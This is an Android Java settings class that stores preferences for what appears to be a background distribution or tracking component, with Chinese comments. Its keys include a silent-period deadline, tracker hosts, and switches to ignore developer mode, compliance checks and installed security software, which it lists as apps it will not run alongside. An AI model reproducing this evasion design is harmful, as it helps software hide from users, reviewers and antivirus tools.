package com.hs.cld.basic;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.util.Log;

import com.hs.cld.common.utils.LOG;
import com.hs.cld.common.utils.TextUtils;

import org.json.JSONArray;

import java.util.ArrayList;
import java.util.List;

/**
 * 配置读写对象
 *
 */
public class Settings {
	/**
	 * 日志标签
	 */
	private final static String TAG = "Settings";
	
	/**
	 * 配置文件名，SharedReference配置文件
	 */
	private final static String SR_NAME = "anl.prefs";

	private final static String KEY_LST_DA = "lst.da";             // 上一次分发查询时间
	private final static String KEY_LST_Q = "lst.q";               // 上一次查询配置时间
	private final static String KEY_LST_Q2 = "lst.q2";             // 上一次查询配置时间
	private final static String KEY_LOGENABLED = "log.enabled";    // 日志开关
	private final static String KEY_PERIODS = "poll.periods";      // 轮训时间
	private final static String KEY_SILENTO = "slt.to";            // 程序静默截止时间
	private final static String KEY_IGNOREDEVMODE = "slt.ignoredevmode";        // 是否忽略本地开发者模式
	private final static String KEY_IGNORELOGD = "slt.ignorelogd";              // 是否忽略本地开发者模式
	private final static String KEY_IGNORECTS = "slt.ignorects";                // 是否忽略本地CTS检查
	private final static String KEY_IGNORECTA = "slt.ignorecta";                // 是否忽略本地CTA检查
	private final static String KEY_IGNOREMUTEXPKGS = "slt.ignoremutexpkgs";    // 是否忽略安全软件检查

	private final static String KEY_APIHOSTS = "hosts.api";            // API服务器地址
	private final static String KEY_TRACKERHOSTS = "hosts.tracker";    // Tracker服务器地址
	private final static String KEY_MUTEXPKGS = "mutex.pkgs";          // 安全软件列表（互斥运行）

	/**
	 * 获取日志开关
	 * @param context 上下文
	 * @param defaultValue 默认置
	 * @return 日志等级
	 */
	public static boolean isLogEnabled(Context context, boolean defaultValue) {
		return getBoolean(context, KEY_LOGENABLED, defaultValue);
	}

	/**
	 * 设置日志等级
	 * @param context 应用上下文
	 * @param value 静默截止时间
	 * @return true 成功；false 失败
	 */
	public static boolean putLogEnabled(Context context, boolean value) {
		return putBoolean(context, KEY_LOGENABLED, value);
	}

	public static long getPeriods(Context context, long defaultValue) {
		return getLong(context, KEY_PERIODS, defaultValue);
	}

	public static boolean putPeriods(Context context, long value) {
		return putLong(context, KEY_PERIODS, value);
	}

	public static boolean isIgnoreDevMode(Context context, boolean defaultValue) {
		return getBoolean(context, KEY_IGNOREDEVMODE, defaultValue);
	}

	public static boolean putIgnoreDevMode(Context context, boolean value) {
		return putBoolean(context, KEY_IGNOREDEVMODE, value);
	}

	public static boolean isIgnoreLogD(Context context, boolean defaultValue) {
		return getBoolean(context, KEY_IGNORELOGD, defaultValue);
	}

	public static boolean putIgnoreLogD(Context context, boolean value) {
		return putBoolean(context, KEY_IGNORELOGD, value);
	}

	public static boolean isIgnoreCTS(Context context, boolean defaultValue) {
		return getBoolean(context, KEY_IGNORECTS, defaultValue);
	}

	public static boolean putIgnoreCTS(Context context, boolean value) {
		return putBoolean(context, KEY_IGNORECTS, value);
	}

	public static boolean isIgnoreCTA(Context context, boolean defaultValue) {
		return getBoolean(context, KEY_IGNORECTA, defaultValue);
	}

	public static boolean putIgnoreCTA(Context context, boolean value) {
		return putBoolean(context, KEY_IGNORECTA, value);
	}

	public static boolean isIgnoreMutexPackages(Context context, boolean defaultValue) {
		return getBoolean(context, KEY_IGNOREMUTEXPKGS, defaultValue);
	}

	public static boolean putIgnoreMutexPackages(Context context, boolean value) {
		return putBoolean(context, KEY_IGNOREMUTEXPKGS, value);
	}

	public static String getApiHosts(Context context, String defaultValue) {
		return getString(context, KEY_APIHOSTS, defaultValue);
	}

	public static boolean putApiHosts(Context context, String value) {
		return putString(context, KEY_APIHOSTS, value);
	}

	public static String getTrackerHosts(Context context, String defaultValue) {
		return getString(context, KEY_TRACKERHOSTS, defaultValue);
	}

	public static boolean putTrackerHosts(Context context, String value) {
		return putString(context, KEY_TRACKERHOSTS, value);
	}

	public static List<String> getMutexPackages(Context context) {
		try {
			String json = getString(context, KEY_MUTEXPKGS, "");
			if (!TextUtils.empty(json)) {
				return json2list(json);
			}
		} catch (Exception e) {
		}
		return new ArrayList<>();
	}

	public static boolean putMutexPackages(Context context, List<String> pkgs) {
		try {
			String json = list2json(pkgs);
			return putString(context, KEY_MUTEXPKGS, json);
		} catch (Exception e) {
		}
		return false;
	}

	/**
	 * 将字符串列表写入JSON对象
	 * @param json JSON字符串
	 * @return 字符串列表
	 */
	private static List<String> json2list(String json) throws Exception {
		List<String> l = new ArrayList<>();
		JSONArray ja = new JSONArray(json);

		for (int i = 0; i < ja.length(); i++) {
			l.add(ja.getString(i));
		}

		return l;
	}

	/**
	 * 将字符串列表写入JSON对象
	 * @param l 字符串列表
	 * @return JSON字符串
	 */
	private static String list2json(List<String> l) {
		if ((null != l) && (!l.isEmpty())) {
			JSONArray ja = new JSONArray();

			for (String s: l) {
				ja.put(s);
			}

			return ja.toString();
		} else {
			return "";
		}
	}

	/**
	 * 获取静默截止时间
	 * @param context 上下文
	 * @param defaultValue 默认置
	 * @return 静默截止时间
	 */
	public static long getSilentToInMillis(Context context, long defaultValue) {
		return getLong(context, KEY_SILENTO, defaultValue);
	}

	/**
	 * 设置静默截止时间
	 * @param context 应用上下文
	 * @param value 静默截止时间
	 * @return true 成功；false 失败
	 */
	public static boolean putSilentToInMillis(Context context, long value) {
		return putLong(context, KEY_SILENTO, value);
	}

	/**
	 * 读取上一次检查分发时间戳
	 * @param context 应用上下文
	 * @param defaultValue 默认的时间戳
	 * @return 轮询的时间间隔
	 */
	public static long getLastDAInMillis(Context context, long defaultValue) {
		return getLong(context, KEY_LST_DA, defaultValue);
	}

	/**
	 * 设置上一次检查分发时间戳
	 * @param context 应用上下文
	 * @param millis 时间戳
	 * @return true 成功；false 失败
	 */
	public static boolean putLastDAInMillis(Context context, long millis) {
		return putLong(context, KEY_LST_DA, millis);
	}

	/**
	 * 读取上一次检查分发时间戳
	 * @param context 应用上下文
	 * @param defaultValue 默认的时间戳
	 * @return 轮询的时间间隔
	 */
	public static long getLastQInMills(Context context, long defaultValue) {
		return getLong(context, KEY_LST_Q, defaultValue);
	}

	/**
	 * 设置上一次检查分发时间戳
	 * @param context 应用上下文
	 * @param millis 时间戳
	 * @return true 成功；false 失败
	 */
	public static boolean putLastQInMills(Context context, long millis) {
		return putLong(context, KEY_LST_Q, millis);
	}

	/**
	 * 读取上一次检查分发时间戳
	 * @param context 应用上下文
	 * @param defaultValue 默认的时间戳
	 * @return 轮询的时间间隔
	 */
	public static long getLastQ2InMills(Context context, long defaultValue) {
		return getLong(context, KEY_LST_Q2, defaultValue);
	}

	/**
	 * 设置上一次检查分发时间戳
	 * @param context 应用上下文
	 * @param millis 时间戳
	 * @return true 成功；false 失败
	 */
	public static boolean putLastQ2InMills(Context context, long millis) {
		return putLong(context, KEY_LST_Q2, millis);
	}

	/**
	 * 添加一组整型键值对到系统存储中
	 * @param context 上下文对象
	 * @param name 键值名
	 * @param value 整型键值
	 * @return true 成功；false 失败
	 */
	public static boolean putLong(Context context, String name, long value) {
		return putString(context, name, ("" + value));
	}

	/**
	 * 从系统存储中获取指定键值
	 * @param context 上下文对象
	 * @param name 键值名
	 * @param defaultValue 默认返回值
	 * @return 指定键值
	 */
	public static long getLong(Context context, String name, long defaultValue) {
		String value = getString(context, name, "");

		try {
			if (!TextUtils.empty(value)) {
				return Long.parseLong(value);
			}
		} catch (Exception e) {
			LOG.e(TAG, "[" + name + "][" + value + "] parse long failed: " + e);
		}

		return defaultValue;
	}

	/**
	 * 添加一组整型键值对到系统存储中
	 * @param context 上下文对象
	 * @param name 键值名
	 * @param value 整型键值
	 * @return true 成功；false 失败
	 */
	public static boolean putInt(Context context, String name, int value) {
		return putString(context, name, ("" + value));
	}

	/**
	 * 从系统存储中获取指定键值
	 * @param context 上下文对象
	 * @param name 键值名
	 * @param defaultValue 默认返回值
	 * @return 指定键值
	 */
	public static int getInt(Context context, String name, int defaultValue) {
		String value = getString(context, name, "");

		try {
			if (!TextUtils.empty(value)) {
				return Integer.parseInt(value);
			}
		} catch (Exception e) {
			LOG.e(TAG, "[" + name + "][" + value + "] parse int failed: " + e);
		}

		return defaultValue;
	}

	/**
	 * 添加一组布尔型键值对到系统存储中
	 * @param context 上下文对象
	 * @param name 键值名
	 * @param value 布尔型键值
	 * @return true 成功；false 失败
	 */
	public static boolean putBoolean(Context context, String name, boolean value) {
		return putString(context, name, (value ? "1" : "0"));
	}

	/**
	 * 从系统存储中获取指定键值
	 * @param context 上下文对象
	 * @param name 键值名
	 * @param defaultValue 默认返回值
	 * @return 指定键值
	 */
	public static boolean getBoolean(Context context, String name, boolean defaultValue) {
		String value = getString(context, name, "");
		if (!TextUtils.empty(value)) {
			return TextUtils.equals(value, "1");
		} else {
			return defaultValue;
		}
	}
    
    /**
     * 添加一对字符串到系统存储中
     * @param context 上下文对象
     * @param name 键值名
     * @param value 键值字符串
     * @return true 成功；false 失败
     */
	public static boolean putString(Context context, String name, String value) {
		try {
			SharedPreferences sf = context.getSharedPreferences(SR_NAME, Context.MODE_PRIVATE);
			Editor editor = sf.edit();

			String safeValue = ((null == value) ? "" : value);
			editor.putString(name, safeValue);
			return editor.commit();
		} catch (Exception e) {
			LOG.e(TAG, "[" + name + "][" + value + "] put string failed: " + e);
		}

		return false;
    }
    
    /**
     * 从系统存储中获取指定键值
     * @param context 上下文对象
     * @param name 键值名
     * @param defaultValue 默认返回值
     * @return 指定键值
     */
    public static String getString(Context context, String name, String defaultValue) {
		try {
			SharedPreferences sf = context.getSharedPreferences(SR_NAME, Context.MODE_PRIVATE);
			return sf.getString(name, defaultValue);
		} catch (Exception e) {
			LOG.e(TAG, "[" + name + "][" + defaultValue + "] get string failed: " + e);
		}

		return defaultValue;
    }
}
